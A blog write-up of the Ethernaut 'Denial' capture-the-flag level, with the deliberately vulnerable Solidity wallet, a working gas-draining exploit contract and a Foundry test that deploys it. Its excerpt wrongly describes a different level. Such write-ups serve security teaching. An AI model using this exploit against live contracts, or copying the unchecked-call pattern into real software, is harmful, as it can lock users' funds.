---
title: 'Ethernaut Challenge #19 Solution — Denial'
excerpt: This is Part 19 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>To solve this challenge, we need to create and deploy a smart contract that weight less than 10 bytes and answer `42` when `whatIsTheMeaningOfLife` function is called.
coverImage:
  url: '/assets/blog/ethernaut/denial.svg'
  credit:
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2022-08-09T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/denial.svg'
---

This is Part 19 of the ["Let’s play OpenZeppelin Ethernaut CTF"](https://stermi.medium.com/lets-play-ethernaut-ctf-learning-solidity-security-while-playing-1678bd6db3c4) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

## Challenge #19: Denial

> This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.
>
> If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
>
> Level author(s): [Adrian Manning](https://github.com/AgeManning)

To solve the challenge, we need to DOS the withdrawal process. Let's go!

## Study the contracts

Let's review the contract code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Denial {
    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```

The contract is pretty easy to understand. The idea behind it is that the **partner** is the person that will pay up for the gas fee to call `withdraw` and will be repaid with 1% of the balance of the contract for each withdrawal operation.

In a real-life scenario, you should calculate if the gas cost to perform the operation is worth that 1%, but this is not part of the scope of the challenge.

The only function interesting to us is the `withdraw`, let's see it

```solidity
// withdraw 1% to recipient and 1% to owner
function withdraw() public {
    uint256 amountToSend = address(this).balance.div(100);
    partner.call{value: amountToSend}("");
    owner.transfer(amountToSend);
    timeLastWithdrawn = now;
    withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
}
```

Let's see step by step what this function do:

- set the contract's balance in `amountToSend`
- transfer 1% of the balance to the `partner` via a low-level `call`
- transfer 1% of the balance to the contract's `owner` via `transfer`
- update the last time the `withdraw` function has been executed
- update the amount that has been withdrawn by the partner

As we said, this challenge is all about the concept of Denial of Service (DOS) that is a general term to describe a situation where an external actor deny an aspect of a service. In this specific case, we want to deny the `withdraw` process of the contract.

How can we do that? The only options we have is to do something bad in the external `call` made to the `partner` address. Let's see how the low-level `call` works in Solidity.

`(bool success, bytes memory data) = targetAddress.call{value: <weiSent>, gas: <gasForwarded>}(<calldata>);`

As I mentioned, this is a low-level function that allow you to do many things. Usually, it's used to:

- send Ether to an EAO by specifying the amount of wei in the `value` options
- send Ether to a contract that has implemented a `receive` or `fallback` function by specifying the amount of wei in the `value` options
- call a contract function by passing which function and which parameters pass to the target's function via the `<calldata>`. For example, `abi.encodeWithSignature("callMePlease()")`

While both `transfer` and `send` high-level function (used to send ETH to a target address) use a hard-coded amount of **2300 gas** to perform the operation, the `call` function has two options:

- by default if you don't specify anything it will forward **all the remaining transaction gas**
- otherwise, you can specify the amount of gas that the external contract can use with the `gas` parameter

The `call` function will return two parameters:

- `bool success` if the call has succeeded
- `bytes memory data` the returned value

Each time you perform a `call` you should **ALWAYS** check if it has succeeded and revert (or handle it however your scenario need) if the `success` value is false. See [SWC-104: Unchecked Call Return Value](https://swcregistry.io/docs/SWC-104) for more information about this aspect.

Anyway, going back to our scenario. We need to find a way to DoS the `Denial` `withdraw` function when it will send to us (the `partner`) the funds.

Because the `withdraw` function is not checking the returned value (this is, in general, a huge bug, see the SWC-104 issue) the flow of the function would continue **even if we reverted** inside the call execution. How could we force the execution to halt?

The only option that we have is to **drain all the forwarded gas** and make the smart contract revert because of "Out of Gas" exception.

A simple way to do that is to have an infinite loop that perform a counter increase on a state variable. Easy right?

```solidity
function exploit() public {
    uint256 index;
    for (index = 0; index < uint256(-1); index++) {
        sum += 1;
    }
}
```

## Solution code

First, we need to deploy a contract that will be used as the `partner`

```solidity
contract Exploiter {
    uint256 private sum;

    function withdraw(Denial victim) external {
        // Call the victim `withdraw` function initializing the DoS process
        victim.withdraw();
    }

    function exploit() public {
        // An infinite loop that will drain all the transaction gas
        uint256 index;
        for (index = 0; index < uint256(-1); index++) {
            sum += 1;
        }
    }

    receive() external payable {
        // This function is executed when someone will send ETH to the contract
        exploit();
    }
}
```

When the `withdraw` function in `Denial` contract will transfer `amountToSend` to the `partner` the `Exploiter.receive` function will be executed and as a consequence, the transaction will revert because of the infinite loop inside the `exploit` function.

Here's the code executed by the test

```solidity
function exploitLevel() internal override {
    vm.startPrank(player, player);

    // deploy the exploiter contract
    Exploiter exploiter = new Exploiter();

    // set the exploiter as the partner
    level.setWithdrawPartner(address(exploiter));

    // The `withdraw` function will be called automatically by the `DenialFactory` contract

    vm.stopPrank();
}
```

You can read the full solution of the challenge opening [Denial.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/Denial.t.sol)

## Further reading

- [Solidity Docs: Message Calls](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#message-calls)
- [SWC-134: Message call with hard-coded gas amount](https://swcregistry.io/docs/SWC-134)
- [SWC-113: DoS with Failed Call](https://swcregistry.io/docs/SWC-113)
- [SWC-104: Unchecked Call Return Value](https://swcregistry.io/docs/SWC-104)
- [SWC-126: Insufficient Gas Griefing](https://swcregistry.io/docs/SWC-126)
- [Consensys Ethereum Smart Contract Best Practices: Denial of Service](https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
